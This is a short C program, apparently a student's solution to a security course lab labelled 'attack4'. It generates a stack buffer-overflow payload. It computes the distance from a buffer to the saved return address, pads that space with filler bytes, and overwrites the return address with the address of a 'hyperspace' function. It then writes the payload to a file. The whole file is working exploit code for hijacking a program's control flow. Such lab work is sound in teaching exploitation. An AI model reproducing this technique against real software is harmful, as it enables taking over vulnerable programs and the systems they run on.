#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util-program.h"


int main(int argc, char **argv)
{
    /* YOUR CODE: Generate buf appropriately */
    long hyperspace_addr = 0x8049222;
    long eip_addr = 0xffffd09c;
    long attack4_buffer_addr = 0xFFFFD057;
    int offset = eip_addr - attack4_buffer_addr;
    printf("Offset4: %d\n", offset);
    
    char attack4_buffer[offset + 4];
    memset(attack4_buffer, '*', offset);
    memcpy(attack4_buffer + offset, &hyperspace_addr, 4);

    write_to_file( "payloads/attack4-payload", attack4_buffer, sizeof(attack4_buffer), FILE_CLEAR );
    exit(0);
}